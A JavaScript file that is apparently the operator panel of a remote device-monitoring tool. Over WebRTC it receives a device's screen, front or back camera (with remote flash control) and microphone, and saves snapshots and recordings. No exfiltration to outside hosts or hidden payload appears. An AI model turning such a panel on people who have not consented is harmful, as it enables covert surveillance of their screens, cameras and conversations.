// ==================== WEBRTC ====================
function createPeerConnection(type, onTrack, useMic, iceServers = window.CONFIG.ICE_SERVERS) {
    const pc = new RTCPeerConnection({ iceServers: iceServers });
    if (type === 'screen') pc.addTransceiver('video', { direction: 'recvonly' });
    else if (type === 'camera') { pc.addTransceiver('video', { direction: 'recvonly' }); if (useMic) pc.addTransceiver('audio', { direction: 'recvonly' }); }
    else if (type === 'audio') pc.addTransceiver('audio', { direction: 'recvonly' });
    pc.ontrack = onTrack;
    pc.onicecandidate = e => { if (e.candidate) sendSignaling({ type: 'ICE_CANDIDATE', candidate: e.candidate, streamType: type }); };
    pc.oniceconnectionstatechange = () => console.log(`${type} ICE state:`, pc.iceConnectionState);
    return pc;
}

async function toggleScreen() {
    if (window.screenActive) {
        if (window.screenPC) window.screenPC.close();
        window.screenPC = null;
        window.screenActive = false;
        document.getElementById('screenBtn').innerText = 'Start Screen';
        document.getElementById('screenModalOverlay').classList.remove('show');
        sendSignaling({ type: 'STOP_SCREEN' });
        if (window.screenMediaRecorder && window.screenMediaRecorder.state === 'recording') window.screenMediaRecorder.stop();
        window.screenMediaRecorder = null;
        window.screenRecordedChunks = [];
        const modalVideo = document.getElementById('modalScreenVideo');
        if (modalVideo) modalVideo.srcObject = null;
    } else {
        document.getElementById('screenModalOverlay').classList.add('show');
        document.body.classList.add('modal-open');
        const modalVideo = document.getElementById('modalScreenVideo');
        if (modalVideo) modalVideo.srcObject = null;
        window.screenPC = createPeerConnection('screen', e => {
            const modalVideo = document.getElementById('modalScreenVideo');
            if (modalVideo && e.streams[0]) {
                modalVideo.srcObject = e.streams[0];
                console.log('Screen stream received');
            }
        }, false);
        try {
            const offer = await window.screenPC.createOffer();
            await window.screenPC.setLocalDescription(offer);
            sendSignaling({ type: 'OFFER', sdp: offer.sdp, streamType: 'screen' });
            document.getElementById('screenBtn').innerText = 'Stop Screen';
            window.screenActive = true;
            window.screenMediaRecorder = null;
            window.screenRecordedChunks = [];
            document.getElementById('modalRecordBtn').innerText = '🔴';
        } catch (e) {
            console.error('Screen share failed:', e);
            showNotification('Failed: ' + e.message);
            window.screenPC = null;
            document.getElementById('screenModalOverlay').classList.remove('show');
            document.body.classList.remove('modal-open');
        }
    }
}

function snapScreenFromModal() {
    const video = document.getElementById('modalScreenVideo');
    if (!video || !video.videoWidth) {
        alert('No active screen share or video not ready yet. Please wait a moment.');
        return;
    }
    const canvas = document.createElement('canvas');
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    canvas.getContext('2d').drawImage(video, 0, 0);
    canvas.toBlob(blob => {
        const url = URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.download = `screen-${Date.now()}.png`;
        a.href = url;
        a.click();
        URL.revokeObjectURL(url);
        showNotification('Screenshot saved');
    }, 'image/png');
}

function toggleScreenRecording() {
    const video = document.getElementById('modalScreenVideo');
    if (!video || !video.srcObject) {
        alert('No active screen share. Start screen share first.');
        return;
    }
    if (window.screenMediaRecorder && window.screenMediaRecorder.state === 'recording') {
        window.screenMediaRecorder.stop();
        document.getElementById('modalRecordBtn').innerText = '🔴';
        showNotification('Recording stopped');
    } else {
        if (video.videoWidth === 0) {
            video.addEventListener('loadedmetadata', () => startScreenRecording(), { once: true });
        } else {
            startScreenRecording();
        }
    }
}

function startScreenRecording() {
    const video = document.getElementById('modalScreenVideo');
    if (!video || !video.videoWidth) {
        alert('Video not ready. Please wait.');
        return;
    }
    window.screenRecordedChunks = [];
    const canvas = document.createElement('canvas');
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    const ctx = canvas.getContext('2d');
    const drawFrame = () => {
        if (video.videoWidth && video.videoHeight) {
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        }
        requestAnimationFrame(drawFrame);
    };
    drawFrame();
    const canvasStream = canvas.captureStream(30);
    const originalStream = video.srcObject;
    if (originalStream && originalStream.getAudioTracks().length) {
        originalStream.getAudioTracks().forEach(track => canvasStream.addTrack(track));
    }
    window.screenMediaRecorder = new MediaRecorder(canvasStream, { mimeType: 'video/webm' });
    window.screenMediaRecorder.ondataavailable = e => {
        if (e.data.size > 0) window.screenRecordedChunks.push(e.data);
    };
    window.screenMediaRecorder.onstop = () => {
        const blob = new Blob(window.screenRecordedChunks, { type: 'video/webm' });
        const url = URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = `screen-recording-${Date.now()}.webm`;
        a.click();
        URL.revokeObjectURL(url);
        window.screenRecordedChunks = [];
        showNotification('Recording saved');
    };
    window.screenMediaRecorder.start(1000);
    document.getElementById('modalRecordBtn').innerText = '🟢';
    showNotification('Recording started');
}

function toggleFullscreen() {
    const video = document.getElementById('modalScreenVideo');
    if (!video) return;
    if (!document.fullscreenElement) {
        video.requestFullscreen().catch(err => console.warn('Fullscreen error:', err));
    } else {
        document.exitFullscreen();
    }
}

function closeScreenModal() {
    if (window.screenMediaRecorder && window.screenMediaRecorder.state === 'recording') {
        window.screenMediaRecorder.stop();
    }
    document.getElementById('screenModalOverlay').classList.remove('show');
    document.body.classList.remove('modal-open');
    if (window.screenActive) {
        if (window.screenPC) window.screenPC.close();
        window.screenPC = null;
        window.screenActive = false;
        document.getElementById('screenBtn').innerText = 'Start Screen';
        sendSignaling({ type: 'STOP_SCREEN' });
    }
    const modalVideo = document.getElementById('modalScreenVideo');
    if (modalVideo) modalVideo.srcObject = null;
    document.getElementById('modalRecordBtn').innerText = '🔴';
}

document.getElementById('modalSnapBtn').addEventListener('click', snapScreenFromModal);
document.getElementById('modalRecordBtn').addEventListener('click', toggleScreenRecording);
document.getElementById('modalFullscreenBtn').addEventListener('click', toggleFullscreen);
document.getElementById('modalCloseBtn').addEventListener('click', closeScreenModal);

function showCameraModal(stream, cameraType) {
    const modal = document.getElementById('cameraModalOverlay');
    const video = document.getElementById('modalCameraVideo');
    video.srcObject = stream;
    window.currentCameraStream = stream;
    modal.classList.add('show');
    document.body.classList.add('modal-open');
    let recording = false, recorder = null, chunks = [];
    document.getElementById('cameraSnapBtn').onclick = () => {
        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        canvas.getContext('2d').drawImage(video, 0, 0);
        canvas.toBlob(b => { const a = document.createElement('a'); a.href = URL.createObjectURL(b); a.download = `snapshot_${Date.now()}.png`; a.click(); URL.revokeObjectURL(b); });
    };
    document.getElementById('cameraRecordBtn').onclick = () => {
        if (recording && recorder) { recorder.stop(); document.getElementById('cameraRecordBtn').innerText = '🔴'; recording = false; }
        else {
            chunks = [];
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const ctx = canvas.getContext('2d');
            const draw = () => { ctx.drawImage(video, 0, 0, canvas.width, canvas.height); requestAnimationFrame(draw); };
            draw();
            const canvasStream = canvas.captureStream(30);
            if (stream.getAudioTracks().length) stream.getAudioTracks().forEach(t => canvasStream.addTrack(t));
            recorder = new MediaRecorder(canvasStream);
            recorder.ondataavailable = e => chunks.push(e.data);
            recorder.onstop = () => {
                const blob = new Blob(chunks, { type: 'video/webm' });
                const a = document.createElement('a');
                a.href = URL.createObjectURL(blob);
                a.download = `recording_${Date.now()}.webm`;
                a.click();
                URL.revokeObjectURL(blob);
                canvasStream.getTracks().forEach(t => t.stop());
            };
            recorder.start();
            recording = true;
            document.getElementById('cameraRecordBtn').innerText = '🟢';
        }
    };
    document.getElementById('cameraFullscreenBtn').onclick = () => { if (video.requestFullscreen) video.requestFullscreen(); };
    document.getElementById('cameraCloseBtn').onclick = () => {
        if (recorder && recorder.state === 'recording') recorder.stop();
        if (stream) stream.getTracks().forEach(t => t.stop());
        modal.classList.remove('show');
        document.body.classList.remove('modal-open');
        if (window.cameraPC) window.cameraPC.close();
        window.cameraPC = null;
        sendSignaling({ type: 'STOP_CAMERA' });
        sendCommand('FLASH_OFF');
    };
}

async function startLiveCamera() {
    const camera = document.querySelector('input[name="liveCameraSelect"]:checked').value;
    const useFlash = document.getElementById('liveFlashCheckbox').checked;
    const useMic = document.getElementById('liveMicCheckbox').checked;
    if (useFlash && camera === 'back') sendCommand('FLASH_ON');
    window.cameraPC = createPeerConnection('camera', e => showCameraModal(e.streams[0], camera), useMic);
    const offer = await window.cameraPC.createOffer();
    await window.cameraPC.setLocalDescription(offer);
    sendSignaling({ type: 'OFFER', sdp: offer.sdp, streamType: 'camera', camera, flash: useFlash, mic: useMic });
}

function stopLiveStream() {
    if (window.cameraPC) window.cameraPC.close();
    window.cameraPC = null;
    sendSignaling({ type: 'STOP_CAMERA' });
    sendCommand('FLASH_OFF');
    window.panel.innerHTML = 'Ready.';
}

function showAudioModal(stream) {
    const modal = document.getElementById('audioModalOverlay');
    const audio = document.getElementById('modalAudioPlayer');
    audio.srcObject = stream;
    window.currentAudioStream = stream;
    modal.classList.add('show');
    document.body.classList.add('modal-open');
    let recording = false, recorder = null, chunks = [];
    document.getElementById('audioRecordBtn').onclick = () => {
        if (recording && recorder) { recorder.stop(); document.getElementById('audioRecordBtn').innerText = '🔴'; recording = false; }
        else {
            chunks = [];
            recorder = new MediaRecorder(stream);
            recorder.ondataavailable = e => chunks.push(e.data);
            recorder.onstop = () => {
                const blob = new Blob(chunks, { type: 'audio/webm' });
                const a = document.createElement('a');
                a.href = URL.createObjectURL(blob);
                a.download = `audio_${Date.now()}.webm`;
                a.click();
                URL.revokeObjectURL(blob);
            };
            recorder.start();
            recording = true;
            document.getElementById('audioRecordBtn').innerText = '🟢';
        }
    };
    document.getElementById('audioCloseBtn').onclick = () => {
        if (recorder && recorder.state === 'recording') recorder.stop();
        if (stream) stream.getTracks().forEach(t => t.stop());
        modal.classList.remove('show');
        document.body.classList.remove('modal-open');
        stopLiveAudio();
    };
}

async function startLiveAudio() {
    window.audioPC = createPeerConnection('audio', e => showAudioModal(e.streams[0]), true);
    const offer = await window.audioPC.createOffer();
    await window.audioPC.setLocalDescription(offer);
    sendSignaling({ type: 'OFFER', sdp: offer.sdp, streamType: 'audio', mic: true });
    document.getElementById('liveAudioBtn').style.display = 'none';
    document.getElementById('stopLiveAudioBtn').style.display = 'block';
}

function stopLiveAudio() {
    if (window.audioPC) window.audioPC.close();
    window.audioPC = null;
    sendSignaling({ type: 'STOP_AUDIO' });
    document.getElementById('liveAudioBtn').style.display = 'block';
    document.getElementById('stopLiveAudioBtn').style.display = 'none';
    window.panel.innerHTML = 'Ready.';
}
